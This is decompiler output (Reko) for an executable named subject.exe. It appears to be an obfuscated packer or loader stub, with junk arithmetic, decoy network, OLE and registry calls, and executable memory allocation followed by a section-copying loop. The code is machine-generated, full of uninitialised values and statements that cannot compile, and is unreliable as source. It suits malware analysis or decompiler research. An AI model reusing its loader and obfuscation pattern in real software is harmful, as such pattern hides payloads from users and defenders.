// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 fn00401000(Register Eq_2 eax, Register word32 ecx, Register (ptr Eq_4) ebp, Register Eq_5 esi, Stack Eq_2 tArg04, Stack Eq_7 tArg08, Stack Eq_2 tArg0C, Stack Eq_2 tArg10, Register out ptr32 ecxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut)
Eq_2 fn00401000(Eq_2 eax, word32 ecx, Eq_4 * ebp, Eq_5 esi, Eq_2 tArg04, SIZE_T tArg08, Eq_2 tArg0C, Eq_2 tArg10, ptr32 & ecxOut, ptr32 & ebpOut, ptr32 & esiOut)
{
	*(v3 - 0x04) = (struct Eq_4 **) ebp;
	*(v3 - 0x08) = ecx;
	*(v3 - 0x0C) = (union Eq_5 *) esi;
	*(v3 - 0x60) = 0x00;
	*(v3 - 0x10) = v3 - 0x60;
	*(v3 - 0x14) = v3 - 0x60;
	*(v3 - 0x18) = v3 - 0x60;
	*(v3 - 0x1C) = v3 - 0x60;
	*(v3 - 0x20) = v3 - 0x60;
	*(v3 - 0x24) = v3 - 0x60;
	*(v3 - 0x28) = v3 - 0x60;
	ptr32 esp_30;
	word32 edi_31;
	ptr32 ebp_32;
	int32 ecx_33;
	word32 esi_34;
	ui32 edx_35;
	ui32 eax_36;
	byte SZO_37;
	byte C_38;
	byte SCZO_39;
	byte Z_40;
	word32 ebx_41;
	byte dl_42;
	byte bl_43;
	byte al_44;
	WS2_32.dll!WSAConnect();
	ui32 edx_46 = edx_35 & eax_36 + 0x01;
	*(ebp_32 - 0x04) = *(ebp_32 - 0x04) & edx_46;
	*(ebp_32 - 0x08) = *(ebp_32 - 0x08) & edx_46;
	*(esp_30 - 0x04) = edx_46;
	*(ebp_32 - 0x0C) = *(ebp_32 - 0x0C) & edx_46;
	*(esp_30 - 0x08) = eax_36 + 0x01;
	*(esp_30 - 0x0C) = eax_36 + 0x01;
	*(ebp_32 - 0x0C) = *(ebp_32 - 0x0C) + (ecx_33 *s 0x00 - 0x01);
	*(ebp_32 - 0x5C) = 0x00;
	*(esp_30 - 0x10) = ebp_32 - 0x5C;
	*(esp_30 - 0x14) = ebp_32 - 0x5C;
	*(esp_30 - 0x18) = ebp_32 - 0x5C;
	*(esp_30 - 0x1C) = ebp_32 - 0x5C;
	*(esp_30 - 0x20) = ebp_32 - 0x5C;
	*(esp_30 - 0x24) = ebp_32 - 0x5C;
	*(esp_30 - 0x28) = ebp_32 - 0x5C;
	word32 esp_83;
	word32 edi_84;
	struct Eq_4 * ebp_85;
	word32 ecx_86;
	word32 esi_87;
	word32 edx_88;
	word32 eax_89;
	byte SZO_90;
	byte C_91;
	byte SCZO_92;
	byte Z_93;
	word32 ebx_94;
	byte dl_95;
	byte bl_96;
	byte al_97;
	WS2_32.dll!WSAConnect();
	if (eax_89 == 0x01)
	{
		word32 ecx_116;
		word32 ebp_117;
		word32 esi_118;
		return fn00401067(eax_89 + 0x01, ebp_85, out ecx_116, out ebp_117, out esi_118);
	}
	else
		return VirtualAlloc(tArg04, tArg08, tArg0C, tArg10);
}

// 00401067: Register Eq_2 fn00401067(Register Eq_2 eax, Register (ptr Eq_4) ebp, Register out ptr32 ecxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut)
Eq_2 fn00401067(Eq_2 eax, Eq_4 * ebp, ptr32 & ecxOut, ptr32 & ebpOut, ptr32 & esiOut)
{
	*ecxOut = ecx;
	uint32 esi_4 = *(ebp - 0x08);
	*esiOut = esi_4;
	uint32 edi_5 = ebp->dw0010;
	if (esi_4 < edi_5)
	{
		ui32 eax_60 = -*(ebp - 0x0C);
		*(ebp - 0x14) = ~((word32) (eax & 0x00) + ebp->dw000C + *(ebp - 0x08));
		ui32 eax_65 = ~(eax_60 - 0x01 | *(ebp - 0x14));
		ui32 edx_68 = ebp->ptr0014 + *(ebp - 0x04);
		*(ebp - 0x14) = 0xFF;
		ui32 ebx_75 = edx_68 & *(ebp - 0x14);
		*(ebp - 0x14) = ~0x00;
		ui32 ebx_79 = ebx_75 ^ *(ebp - 0x14);
		ui32 ebx_87 = ebx_79 + 0x01 & 0x00 ^ ebp->dw0008;
		*(ebp - 0x08) = -*(ebp - 0x08);
		Eq_2 ebx_90 = ebx_87 - *(ebp - 0x08);
		*(ebp - 0x10) = *(ebp - 0x10) & 0x00;
		*(ebp - 0x10) = *(ebp - 0x10) | ebx_90;
		word32 ebx_101 = DPB(*ebx_90, (byte) ((eax_65 & 0xFF) + (ebx_79 + 0x01)), 0);
		*(ebp - 0x08) = -*(ebp - 0x08);
		*(v3 - 0x04) = 0x00;
		*ebx_90 = *(v3 - 0x04);
		*(v3 - 0x04) = (union Eq_2 *) ebx_90;
		*ebx_90 = (byte) fn00401420() + ((word32) (*ebx_90) + -ebx_101);
		ui32 edx_123 = *ebx_90 ^ *(ebp - 0x14);
		*ebx_90 = edx_123 + 0x01;
		word32 edi_131 = (edi_5 & 0x00) + *(ebp - 0x04);
		*(ebp - 0x04) = edi_131 + 0x01;
		eax = ebx_90;
		if (edi_131 == 0x00)
			*(ebp - 0x04) = *(ebp - 0x04) & 0x00;
		if (*(ebp - 0x04) != 0x9A)
		{
			word32 ecx_141;
			word32 ebp_142;
			word32 esi_143;
			return fn00401330(ebx_90, edx_123 + 0x01, ebp, out ecx_141, out ebp_142, out esi_143);
		}
	}
	word32 ebp_46;
	*ebpOut = ebp->dw0000;
	return eax;
}

// 00401128: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	word32 esp_40;
	struct Eq_4 * ebp_41;
	word32 edx_42;
	byte SCZO_43;
	word32 esi_44;
	word32 edi_45;
	word32 ebx_46;
	word32 ecx_47;
	byte SZO_49;
	byte C_50;
	byte Z_51;
	Eq_2 eax_48;
	WS2_32.dll!WSAConnect();
	ptr32 esp_64 = fp - 0x20 - ((fp - 0x60 ^ eax_48) + 0x01);
	*(esp_64 - 0x04) = fp - 0x60;
	*(esp_64 - 0x08) = fp - 0x60;
	*(esp_64 - 0x0C) = fp - 0x60;
	*(esp_64 - 0x10) = fp - 0x04;
	word32 ecx_74 = fp - 0x60 - (fp - 0x60);
	word32 ecx_110 = 0xFFFF;
l00401175:
	eax_48 = (word32) eax_48 + 0x0010;
	if (eax_48 == ~0x01120521)
	{
		word32 ecx_447;
		word32 ebp_448;
		word32 esi_449;
		return fn00401000(eax_48, ecx_110, ebp_41, fp - 0x60, tArg04, tArg08, tArg0C, tArg10, out ecx_447, out ebp_448, out esi_449);
	}
	else
	{
		ecx_110 = ecx_110 - 0x01;
		if (ecx_110 != 0x00)
			goto l00401175;
		*(esp_64 - 0x14) = fp - 0x60;
		*(esp_64 - 0x18) = fp - 0x60;
		*(esp_64 - 0x1C) = fp - 0x60;
		*(esp_64 - 0x20) = fp - 0x60;
		*(esp_64 - 0x24) = fp - 0x60;
		*(esp_64 - 0x28) = fp - 0x60;
		*(esp_64 - 44) = fp - 0x60;
		ptr32 esp_129;
		struct Eq_4 * ebp_130;
		word32 edx_131;
		byte SCZO_132;
		Eq_5 esi_133;
		word32 edi_134;
		word32 ebx_135;
		word32 ecx_136;
		word32 eax_137;
		byte SZO_138;
		byte C_139;
		byte Z_140;
		WS2_32.dll!WSAConnect();
		if (fp != 0x5F)
		{
			word32 ecx_443;
			word32 ebp_444;
			word32 esi_445;
			return fn00401000(fp - 0x5F, ecx_136, ebp_130, esi_133, tArg04, tArg08, tArg0C, tArg10, out ecx_443, out ebp_444, out esi_445);
		}
		else
		{
			*(esp_129 - 0x04) = fp - 0x50;
			*(esp_129 - 0x08) = fp - 0x50;
			*(esp_129 - 0x0C) = fp - 0x50;
			*(esp_129 - 0x10) = fp - 0x50;
			*(esp_129 - 0x14) = fp - 0x50;
			ptr32 esp_158;
			struct Eq_4 * ebp_159;
			word32 edx_160;
			byte SCZO_161;
			word32 esi_162;
			word32 edi_163;
			word32 ebx_164;
			word32 ecx_165;
			word32 eax_166;
			byte SZO_167;
			byte C_168;
			byte Z_169;
			OLECLI32.dll!OleClone();
			if (eax_166 == 0x0D)
			{
				ui32 edi_198 = fp - 0x50 - (fp - 0x50);
				*(esp_158 - 0x04) = edi_198;
				*(esp_158 - 0x08) = edi_198;
				*(esp_158 - 0x0C) = edi_198;
				*(esp_158 - 0x10) = edi_198;
				if (OleLoad(*(esp_158 - 0x10), *(esp_158 - 0x0C), *(esp_158 - 0x08), *(esp_158 - 0x04)) == 0x80070057)
				{
					*(esp_158 - 0x04) = 0x00;
					*(esp_158 - 0x08) = 0x80000004;
					Eq_2 eax_216 = RegDeleteValueW(*(esp_158 - 0x08), *(esp_158 - 0x04));
					if (eax_216 == ~0x05 && eax_216 == ~0x05)
					{
						Eq_2 eax_230 = -0x7FF00685;
						word32 v20_231 = ecx_74 - eax_230;
						int32 v21_237 = v20_231 + ((dwLoc4C & (edi_198 & 0x00)) + 2272615812 ^ 0x077AA4FF);
						fp - 0x04 + -0x18 = v21_237;
						int32 ebx_248 = v20_231 + 2152753531 ^ ~0x00;
						Eq_5 esi_258 = fp - 0x04 + -(((ebx_248 + 0x01) *s 0x00 ^ 0x02A8) + ~0xFF);
						*(esp_158 - 0x04) = 0x004147C8;
						word32 edx_281 = (~(~((ecx & 0x00) + esi_258 - ~0x0F & 0x00) & ~0x30) ^ ~0x00) - ~0x00;
						*(esp_158 - 0x08) = ~((edx_281 & 0x00) + ((esi & v21_237) + edx_281)) - ((edx_281 & 0x00) - 0x01);
						*(esp_158 - 0x0C) = v21_237 - (ebx_248 + 0x01) + (fp - 0x60);
						*(esp_158 - 0x10) = fp - 0x01AC;
						word32 ecx_305;
						word32 esi_307;
						struct Eq_4 * ebp_306;
						fn004013C1(eax_230, ~0x00, ebp_159, esi_258, out ecx_305, out ebp_306, out esi_307);
						*(ebp_306 - 0x08) = *(ebp_306 - 0x08) & 0x00;
						*(ebp_306 - 0x24) = (char *) **(ebp_306 - 0x10) + *(*(ebp_306 - 0x10) - ~0x03);
						*(esp_158 - 0x0C) = 0x40;
						*(ebp_306 - 0x18) = *(ebp_306 - 0x18) & 0x00;
						*(esp_158 - 0x10) = 0x3000;
						*(esp_158 - 0x14) = ebp_306 - 0x24;
						*(esp_158 - 0x18) = 0x00;
						Eq_2 eax_335 = VirtualAlloc(*(esp_158 - 0x18), *(esp_158 - 0x14), *(esp_158 - 0x10), *(esp_158 - 0x0C));
						*(ebp_306 - 0x08) = *(ebp_306 - 0x08) | eax_335;
						*(ebp_306 - 0x20) = eax_335 & 0x00;
						*(ebp_306 - 0x20) = *(ebp_306 - 0x20) | 0x00400000;
						*(ebp_306 - 0x01AC) = *(ebp_306 - 0x01AC) & (eax_335 & 0x00);
						ptr32 esp_336 = esp_158 - 0x08;
						if ((eax_335 & 0x00) == 0x00)
						{
							while (true)
							{
								Eq_5 esi_362 = *(ebp_306 - 0x01AC);
								if (esi_362 >= *((char *) (*(ebp_306 - 0x10)) + 0x08))
									break;
								word32 * esp_367 = esp_336 - 0x04;
								*esp_367 = *(ebp_306 - 0x28);
								*(esp_367 - 0x04) = *((char *) *(ebp_306 - 0x1C) + 0x04);
								*(esp_367 - 0x08) = (char *) **(ebp_306 - 0x1C) + *(ebp_306 - 0x20);
								word32 ecx_379 = *(ebp_306 - 0x08) + *(ebp_306 - 0x18);
								*(esp_367 - 0x0C) = ecx_379;
								ebp_306 = fn004013B6(ecx_379, ebp_306, esi_362);
								*(ebp_306 - 0x18) = (char *) *((char *) *(ebp_306 - 0x1C) + 0x04) + *(ebp_306 - 0x18);
								esp_336 = esp_367 - 0x0C;
								*(ebp_306 - 0x01AC) = *(ebp_306 - 0x01AC) + 0x01;
								*(ebp_306 - 0x1C) = *(ebp_306 - 0x1C) + 0x08;
							}
							word32 * esp_399 = esp_336 - 0x04;
							*esp_399 = *(ebp_306 - 0x20);
							ui32 edi_405 = *(ebp_306 - 0x08) + -~0x152F;
							*(ebp_306 - 0x14) = v11;
							*(ebp_306 - 0x14) = v12;
							*(esp_399 - 0x04) = v13;
							struct Eq_1176 * edi_419 = (edi_405 & 0x00) + *(ebp_306 - 0x10);
							*(ebp_306 - 0x08) = v14;
							Eq_2 eax_423 = *(ebp_306 - 0x08);
							ui32 ebx_425 = (edi_405 & 0x00) - eax_423 + edi_419->dw0004;
							*(esp_399 - 0x08) = ebx_425;
							ui32 ebx_429 = ebx_425 & 0x00 | *(ebp_306 - 0x14);
							*(esp_399 - 0x0C) = ebx_429;
							*(esp_399 - 0x10) = ebx_429 + 0xCC00;
							*(esp_399 - 0x14) = *(ebp_306 - 0x14);
							return eax_423;
						}
						else
						{
							word32 ecx_352;
							word32 ebp_353;
							word32 esi_354;
							return fn00401330(eax_335 & 0x00, 0x40, ebp_306, out ecx_352, out ebp_353, out esi_354);
						}
					}
				}
			}
			*(esp_158 - 0x04) = 0x00;
			*(esp_158 - 0x08) = 0x00;
			*(esp_158 - 0x0C) = 0x00;
			*(esp_158 - 0x10) = 0x00;
			*(esp_158 - 0x14) = 0x00;
			OleSave(*(esp_158 - 0x14), *(esp_158 - 0x10), *(esp_158 - 0x0C));
			*(esp_158 - 0x0C) = 0x00;
			*(esp_158 - 0x10) = 0x80000004;
			return RegDeleteValueA(*(esp_158 - 0x10), *(esp_158 - 0x0C));
		}
	}
}

// 00401330: Register Eq_2 fn00401330(Register Eq_2 eax, Register int32 edx, Register (ptr Eq_4) ebp, Register out ptr32 ecxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut)
Eq_2 fn00401330(Eq_2 eax, int32 edx, Eq_4 * ebp, ptr32 & ecxOut, ptr32 & ebpOut, ptr32 & esiOut)
{
	*(v3 - 0x04) = (union Eq_2 *) eax;
	ui32 ebx_11 = *(ebp - 0x08) - *(ebp - 0x0C);
	*(ebp - 0x08) = *(ebp - 0x08) & edx *s 0x00;
	*(ebp - 0x08) = *(ebp - 0x08) | ebx_11;
	word32 ecx_21;
	word32 ebp_22;
	word32 esi_23;
	return fn00401067(eax, ebp, out ecx_21, out ebp_22, out esi_23);
}

// 004013B6: Register (ptr Eq_4) fn004013B6(Register word32 ecx, Register (ptr Eq_4) ebp, Register Eq_5 esi)
Eq_4 * fn004013B6(word32 ecx, Eq_4 * ebp, Eq_5 esi)
{
	if (true)
	{
		word32 ecx_24;
		struct Eq_4 * ebp_25;
		word32 esi_26;
		fn00401000(0x00, ecx, ebp, esi, tArg04, tArg08, tArg0C, tArg10, out ecx_24, out ebp_25, out esi_26);
		return ebp_25;
	}
	else
	{
		word32 ecx_12;
		struct Eq_4 * ebp_13;
		Eq_5 esi_14;
		Eq_2 eax_15 = fn004013C1(0x00, ecx, ebp, esi, out ecx_12, out ebp_13, out esi_14);
		return ebp_13;
	}
}

// 004013C1: Register Eq_2 fn004013C1(Register Eq_2 eax, Register word32 ecx, Register (ptr Eq_4) ebp, Register Eq_5 esi, Register out ptr32 ecxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut)
Eq_2 fn004013C1(Eq_2 eax, word32 ecx, Eq_4 * ebp, Eq_5 esi, ptr32 & ecxOut, ptr32 & ebpOut, ptr32 & esiOut)
{
	*ebpOut = ebp;
	*ecxOut = ecx;
	*esiOut = esi;
	if (true)
	{
		word32 ecx_70;
		word32 ebp_71;
		word32 esi_72;
		return fn00401000(eax, ecx, ebp, esi, tArg04, tArg08, tArg0C, tArg10, out ecx_70, out ebp_71, out esi_72);
	}
	else
	{
		word32 edi_33 = *(ebp - 0x08) + -~0x152F;
		*(ebp - 0x14) = *(ebp - 0x14) & 0x00;
		*(ebp - 0x14) = *(ebp - 0x14) + edi_33;
		*(ebp - 0x08) = -*(ebp - 0x08);
		return *(ebp - 0x08);
	}
}

// 00401420: FlagGroup bool fn00401420()
bool fn00401420()
{
	return false;
}

